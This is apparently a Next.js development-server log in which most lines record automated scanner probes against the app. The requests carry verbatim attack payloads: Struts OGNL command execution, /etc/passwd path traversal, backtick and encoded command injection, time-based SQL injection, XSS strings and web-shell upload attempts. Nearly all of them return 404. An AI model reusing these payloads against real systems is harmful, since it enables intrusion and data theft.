
> fineval@0.1.0 dev
> next dev -p 10005 --turbopack

   ▲ Next.js 15.3.4 (Turbopack)
   - Local:        http://localhost:10005
   - Network:      http://172.18.0.2:10005
   - Environments: .env.local

 ✓ Starting...
Slow filesystem detected. If /new1/whh01/llmtest/.next is a network drive, consider moving it to a local folder. If you have an antivirus enabled, consider excluding your project directory.
 ✓ Ready in 2s
 ○ Compiling / ...
 GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 76ms
 GET /costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF 404 in 234ms
 GET /myaccount/javax.faces.resource/web.xml?loc=../WEB-INF 404 in 233ms
 GET /cgi-bin/status 404 in 82ms
 GET /test.cgi 404 in 227ms
 GET /cgi-bin/test-cgi 404 in 236ms
 GET /cgi-bin/test.cgi 404 in 77ms
 POST /sys/ui/extend/varkind/custom.jsp 404 in 61ms
 GET /wp-content/plugins/advanced-text-widget/readme.txt 404 in 44ms
 POST /_search 404 in 72ms
 GET /wp-admin/admin.php?where1=<script>alert(document.domain)</script>&searchsubmit=Buscar&page=nsp_search 404 in 70ms
 GET / 200 in 164ms
 GET / 200 in 90ms
 GET /wp-content/plugins/trafficanalyzer/readme.txt 404 in 89ms
 GET / 200 in 248ms
 POST /wp-admin/admin-ajax.php 404 in 797ms
 GET / 200 in 88ms
 GET /wp-content/plugins/sourceafrica/readme.txt 404 in 70ms
 GET /wp-content/plugins/wpsolr-search-engine/readme.txt 404 in 66ms
 GET / 200 in 112ms
 GET /wp-content/plugins/amty-thumb-recent-post/readme.txt 404 in 73ms
 GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 70ms
 GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 64ms
 GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 92ms
 POST /webtools/control/xmlrpc 404 in 77ms
 POST /timesheet/login.php 404 in 66ms
 POST /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 404 in 73ms
 GET / 200 in 106ms
 POST /share/page/dologin 404 in 86ms
 GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd 404 in 70ms
 POST /admin/auth/reset-password 404 in 62ms
 POST /com.example.TestService 404 in 237ms
 POST /wp-admin/options-general.php?page=yuzo-related-post 404 in 71ms
 GET / 200 in 85ms
 GET /wp-content/plugins/raygun4wp/readme.txt 404 in 64ms
 GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences 404 in 72ms
 POST /Collector/appliancesettings/applianceSettingsFileTransfer 404 in 67ms
 GET /talari/app/files/304hNB8BFWhvplBSkTfX2Wlmzku 404 in 78ms
 POST /wls-wsat/CoordinatorPortType 404 in 77ms
 GET /objects/getImage.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=png 404 in 67ms
 GET /objects/getImageMP4.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=jpg 404 in 83ms
 GET /objects/getSpiritsFromVideo.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=jpg 404 in 58ms
 GET /objects/wvjhx.txt 404 in 60ms
 POST /rest/issueNav/1/issueTable 404 in 59ms
 POST / 200 in 88ms
 POST /artifactory/ui/auth/login?_spring_security_remember_me=false 404 in 49ms
 POST /cgi-bin/supportInstaller 404 in 56ms
 POST /Autodiscover/Autodiscover.xml 404 in 57ms
 POST /adxmlrpc.php 404 in 84ms
 GET /objects/getSpiritsFromVideo.php?base64Url=YGlkID4gQW1Qdy50eHRg&format=jpg 404 in 62ms
 GET /objects/AmPw.txt 404 in 88ms
 POST /mailingupgrade.php 404 in 59ms
 GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20gINeNMoOGw.txt%60 404 in 88ms
 POST /kindeditor/php/demo.php 404 in 58ms
 POST /content/304hNGoVrfhAX9f0NZqY9f9w8Qx.af.internalsubmit.json 404 in 72ms
 GET /gINeNMoOGw.txt 404 in 57ms
 POST /v2/api/product/manger/getInfo 404 in 67ms
 GET /api/experimental/test 404 in 578ms
 GET /api/experimental/dags/example_trigger_target_dag/paused/false 404 in 110ms
 POST /roundcube/installer/index.php 404 in 75ms
 GET /wp-content/plugins/my-calendar/readme.txt 404 in 70ms
 GET / 200 in 76ms
 GET /zabbix/zabbix.php 404 in 70ms
 GET / 200 in 109ms
 POST /ajax/api/content_infraction/getIndexableContent 404 in 73ms
 POST /console/images/%252e%252e%252fconsole.portal 404 in 79ms
 GET /user/login 404 in 94ms
 GET /cgi-bin/cgiServer.exx?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 404 in 71ms
 GET /webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f20224d7a4130614535545a4852435430566a645739686556646b55326450646c467a576d563422207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5 404 in 79ms
 GET /webadmin/out 404 in 60ms
 GET /fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27; 404 in 62ms
 GET /cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C 404 in 60ms
 POST /apisix/admin/routes 404 in 33ms
 POST /login 404 in 73ms
 POST /index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image 404 in 138ms
 GET /?p=1 200 in 49ms
 GET /cgi-bin/cgiServer.exx?download=/etc/passwd 404 in 37ms
 GET / 200 in 78ms
 GET /wp-login.php 404 in 35ms
 GET /labkey/home/project-begin.view 404 in 47ms
 POST /service/v1/createUser 404 in 42ms
 GET /setup.cgi?todo=debug&x=currentsetting.htm 404 in 36ms
 GET /v1/kv/304hNQumfITgwO8K86Xkpl0qV5P?raw 404 in 35ms
 GET /assets/data/usrimg/304hnhgsinr6l0xmluods1lhhyn.php 404 in 35ms
 GET /file/LtsEBy.txt 404 in 42ms
 POST /auth/check 404 in 36ms
 POST /auth/newpassword 404 in 36ms
 GET /index.php?module=users/login 404 in 37ms
 POST /auth/requestreset 404 in 53ms
 GET /index.php?module=users/login 404 in 37ms
 GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php 404 in 52ms
 POST /cgi-bin/libagent.cgi?type=J 404 in 38ms
 POST /EemAdminService/EemAdmin 404 in 41ms
 POST /CTCWebService/CTCWebServiceBean/ConfigServlet 404 in 39ms
 GET /PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E 404 in 37ms
 POST /menu/stapp 404 in 65ms
 POST /api/jsonws/invoke 404 in 40ms
 POST /magmi/web/magmi_saveprofile.php 404 in 39ms
 POST /opensis/index.php 404 in 36ms
 POST /index.php 404 in 33ms
 GET /wp-content/plugins/import-xml-feed/readme.txt 404 in 36ms
 POST /cgi-bin/mainfunction.cgi 404 in 36ms
 GET /menu/neo 404 in 35ms
 GET /menu/stc 404 in 89ms
 GET /index.php?app=main&inc=core_auth&route=login 404 in 39ms
 POST / 200 in 128ms
 GET /wp-admin/index.php 404 in 40ms
 POST /getcfg.php 404 in 37ms
 GET /?author=1 200 in 52ms
 POST / 200 in 81ms
 POST /webtools/control/xmlrpc 404 in 50ms
 POST /graphql 404 in 36ms
 GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release 404 in 42ms
 GET /hsqldb%0a 404 in 36ms
 POST /tmui/locallb/workspace/tmshCmd.jsp 404 in 36ms
 POST /tmui/locallb/workspace/tmshCmd.jsp 404 in 42ms
 GET /images/..%2finfo.html 404 in 42ms
 GET /login.php 404 in 94ms
 POST /cgi-bin/mt/mt-xmlrpc.cgi 404 in 37ms
 GET /goform/goform_get_cmd_process?cmd=psw_fail_num_str 404 in 64ms
 GET /wp-content/plugins/event-espresso-core-reg/readme.txt 404 in 46ms
 POST /apply_sec.cgi 404 in 32ms
 ⨯ [TypeError: Failed to parse body as FormData.]
 ○ Compiling /_error ...
 POST /index.php 404 in 225ms
 POST /adminer/adminer.php 404 in 237ms
 ✓ Compiled /_error in 2.6s
 POST /logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D 500 in 8503ms
 POST /_adminer.php 404 in 39ms
 POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 404 in 31ms
 POST /_bulk 404 in 79ms
 POST /api/v1/method.callAnon/getPasswordPolicy 404 in 55ms
 POST /mgmt/shared/authn/login 404 in 56ms
 GET /wp-content/plugins/canto/readme.txt 404 in 59ms
 GET / 200 in 81ms
 POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test 404 in 45ms
 POST /lucee/304hN3UF0gq1RGDbj2jXXFHumnW.cfm 404 in 57ms
 GET / 200 in 58ms
 GET /server-common/cgi-bin/login 404 in 56ms
 GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=" 404 in 67ms
 POST /auth/realms/master/clients-registrations/default 404 in 38ms
 POST /auth/realms/master/clients-registrations/openid-connect 404 in 68ms
 ⨯ [TypeError: Failed to parse body as FormData.]
 POST /wp-comments-post.php 500 in 423ms
 GET /wp-content/plugins/imagements/images/304hnfcyz9eqpkskwsaqwl7w3bi.php 404 in 142ms
 POST /wp-admin/admin-ajax.php 404 in 53ms
 GET /wp-content/uploads/kaswara/fonts_icon/slfgyz/tk.php 404 in 43ms
 GET /wp-content/plugins/wp-statistics/readme.txt 404 in 42ms
 GET /wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home 404 in 89ms
 GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng 200 in 54ms
 POST /wp-admin/admin-ajax.php?action=pollinsertvalues 404 in 39ms
 GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 200 in 93ms
 POST /wp-json/pie/v1/login 404 in 34ms
 ⨯ [TypeError: Failed to parse body as FormData.]
 POST /wp-admin/admin-ajax.php 500 in 301ms
 GET /wp-content/uploads/workreap-temp/304hNB14I1tQk2TnlWf12xP9AlM.php 404 in 83ms
 POST /wp-admin/admin.php?page=contest-gallery/index.php&users_management=true&option_id=1 404 in 74ms
 GET /wp-admin/options.php 404 in 79ms
 GET /wp-admin/profile.php 404 in 84ms
 POST /wp-admin/admin-ajax.php?action=_ning_upload_image 404 in 362ms
 GET / 200 in 85ms
 GET /wp-content/plugins/ultimate-faqs/readme.txt 404 in 71ms
 GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json 404 in 67ms
 GET /wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g 404 in 70ms
 GET /wp-admin/admin.php?page=chaty-contact-form-feed&search=%3C%2Fscript%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E 404 in 60ms
 GET /wp-content/plugins/wpcargo/includes/304hNKii5fAD7mnl0GCo3WvpyRx.php 404 in 80ms
 GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=304hNKii5fAD7mnl0GCo3WvpyRx.php 404 in 75ms
 POST /wp-content/plugins/wpcargo/includes/304hNKii5fAD7mnl0GCo3WvpyRx.php?1=var_dump 404 in 57ms
 GET /swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27 404 in 76ms
 GET /nagiosxi/login.php 404 in 58ms
 POST /run 404 in 57ms
 GET /?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g 200 in 82ms
 GET /wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js 404 in 68ms
 GET /nagiosxi/login.php 404 in 47ms
 GET /nagiosxi/login.php 404 in 60ms
 POST /druid/indexer/v1/sampler 404 in 64ms
 POST /confluence/pages/createpage-entervariables.action 404 in 72ms
 POST /wiki/pages/createpage-entervariables.action?SpaceKey=x 404 in 118ms
 POST /pages/doenterpagevariables.action 404 in 143ms
 POST /webtools/control/SOAPService 404 in 62ms
 POST /patient/search_result.php 404 in 80ms
 GET /wp-content/plugins/daggerhart-openid-connect-generic/readme.txt 404 in 83ms
 GET /wp-content/plugins/pie-register/readme.txt 404 in 70ms
 GET /wp-content/plugins/stop-spammer-registrations-plugin/readme.txt 404 in 76ms
 GET / 200 in 117ms
 POST /contactus.php 404 in 70ms
 GET /wp-content/plugins/giveasap/readme.txt 404 in 74ms
 POST /contactus.php 404 in 69ms
 POST /contactus.php 404 in 64ms
 GET /wp-content/themes/jnews/readme.txt 404 in 43ms
 POST /api/snapshots 404 in 68ms
 GET / 200 in 98ms
 POST /tools.cgi 404 in 70ms
 POST /tools.cgi 404 in 59ms
 GET /backup2.cgi 404 in 75ms
 GET /log_download.cgi?type=../../etc/passwd 404 in 46ms
 GET /log_download.cgi?type=../../etc/passwd 404 in 72ms
 POST /webtools/control/SOAPService 404 in 68ms
 GET / 200 in 82ms
 GET / 200 in 91ms
 POST /seo/seopanel/login.php?sec=forgot 404 in 70ms
 POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld 404 in 79ms
 POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld 404 in 77ms
 POST /webtools/control/SOAPService 404 in 55ms
 GET /module/productcomments/CommentGrade?id_products[]=1*if(now()=sysdate()%2Csleep(8)%2C0) 404 in 68ms
 ⨯ [TypeError: Failed to parse body as FormData.] { page: '/' }
 POST / 500 in 334ms
 GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=304hNGoyW7nsvfroVqP2Z6LOtjw.php&target=l1_Lw 404 in 79ms
 GET /t/index.php?action[]=aaaa 404 in 71ms
 GET /status.htm 404 in 100ms
 POST /RPC2_Login 404 in 69ms
 POST /RPC2_Login 404 in 63ms
 POST /_ignition/execute-solution 404 in 68ms
 POST /_ignition/execute-solution 404 in 72ms
 POST /_ignition/execute-solution 404 in 75ms
 POST /_ignition/execute-solution 404 in 76ms
 POST /_ignition/execute-solution 404 in 70ms
 POST /_ignition/execute-solution 404 in 109ms
[TypeError: Invalid URL] {
  code: 'ERR_INVALID_URL',
  input: '/\\u001B]8;;https://interact.sh"/onmouseover="alert(1)\\u0007example\\u001B]8;;\\u0007',
  base: 'http://n'
}
 POST /wp-admin/admin-ajax.php 404 in 60ms
 ⨯ [TypeError: Failed to parse body as FormData.]
 POST /Config/SaveUploadedHotspotLogoFile 500 in 561ms
 GET /Assets/temp/hotspot/img/logohotspot.txt 404 in 193ms
 ⨯ Error: Failed to decode path param(s).
    at Array.map (<anonymous>)
 GET /%u002e/WEB-INF/web.xml 500 in 136ms
 GET /.%00/WEB-INF/web.xml 404 in 58ms
 POST /?Command=NOOP&InternalFile=../../../../../../../../../../../../../../Windows/win.ini&NewWebClient=1 200 in 88ms
 GET /bludit/admin/login 404 in 83ms
 POST /wp-admin/admin-ajax.php 404 in 65ms
 POST /wp-login.php 404 in 98ms
 PUT /SDK/webLanguage 404 in 74ms
 GET /x 404 in 138ms
 GET /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26 404 in 60ms
 POST /ajaxPages/writeBrowseFilePathAjax.php 404 in 58ms
 GET /dashboardUser 404 in 70ms
 POST /druid/indexer/v1/sampler?for=connect 404 in 67ms
 GET /module/ph_simpleblog/list?sb_category=')%20OR%20true--%20- 404 in 55ms
 GET /module/ph_simpleblog/list?sb_category=')%20AND%20false--%20- 404 in 71ms
 GET /nagiosxi/login.php 404 in 60ms
 POST /home/download 404 in 57ms
 POST /controller/origemdb.php?idselorigem=ATIVOS 404 in 56ms
 POST /controller/login.php?acao=autenticar 404 in 81ms
 POST /controller/login.php?acao=autenticar 404 in 63ms
 GET /wp-admin/admin-ajax.php?action=47a0e932410b17dad341cada2819d670 404 in 79ms
 GET /wp-admin/admin-ajax.php?action=106691fa166d8dd4b96141b6116d043f 404 in 114ms
 POST /wsman 404 in 59ms
 GET /misc.php?action=showpopups&type=friend 404 in 68ms
 GET /api/v1/components?name=1&1%5B0%5D&1%5B1%5D=a&1%5B2%5D&1%5B3%5D=or+'a'='a')%20and%20(select%20sleep(6))-- 404 in 58ms
 POST /wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php 404 in 66ms
 OPTIONS /wp-json/omapp/v1/support 404 in 70ms
 GET /api/help'onmouseover=alert(document.domain)/'/;/beta/license 404 in 58ms
 POST /Config/SaveUploadedHotspotLogoFile 404 in 57ms
 POST /cobbler_api 404 in 75ms
 POST /getcfg.php 404 in 57ms
[Error: Requested and resolved page mismatch: /about/../tree /tree]
[Error: Requested and resolved page mismatch: /about/../tree /tree]
[Error: Requested and resolved page mismatch: /about/../tree /tree]
[Error: Requested and resolved page mismatch: /about/../tree /tree]
 GET /about/../tree?action=get 404 in 140ms
 POST /install.php?page=4 404 in 73ms
 POST /install.php?page=4 404 in 65ms
 POST /install.php?page=1 404 in 67ms
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
 POST /./RestAPI/LogonCustomization 404 in 152ms
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
 POST /./RestAPI/LogonCustomization 404 in 169ms
[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
 POST /./RestAPI/Connection 404 in 199ms
 GET /help/admin-guide/test.jsp 404 in 123ms
 POST /v1/backend1 404 in 77ms
 GET /v1/304hNFcq5GJSV3QnEaxZ6OkGQpv.php 404 in 83ms
 POST /install.php?page=4 404 in 68ms
 POST /install.php?page=4 404 in 73ms
 POST /install.php?page=4 404 in 73ms
 GET /index.php 404 in 64ms
 GET / 200 in 80ms
 GET /fmangersub?cpath=../../../../../../../etc/passwd 404 in 62ms
 GET / 200 in 87ms
 POST /autodiscover/autodiscover.json 404 in 60ms
 POST /delete_cart_goods.php 404 in 76ms
 POST /action.php 404 in 71ms
 POST /homeaction.php 404 in 58ms
 POST /TransferredOutModal.php?modfunc=detail 404 in 53ms
 POST /index.php 404 in 75ms
 GET / 200 in 73ms
 GET / 200 in 61ms
 GET /cgi-bin/slogin/login.py 404 in 57ms
 GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 400 in 20ms
 GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd 404 in 58ms
 POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh 405 in 31ms
 ⨯ Error: Failed to decode path param(s).
    at Array.map (<anonymous>)
 GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd 500 in 114ms
 ⨯ Error: Failed to decode path param(s).
    at Array.map (<anonymous>)
 GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd 500 in 75ms
 GET / 200 in 95ms
 GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=304hN9p0uLYBeKOqc8gy0MxStLf.php:aaa 404 in 82ms
 POST /wp-admin/admin-ajax.php 404 in 80ms
[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
 GET /file/../../../../../../../../../../../../../../../../../../etc/passwd 400 in 22ms
 GET /file/../../../../../../../../../../../../../../../../../../windows/win.ini 404 in 176ms
 POST /classes/Login.php?f=login 404 in 70ms
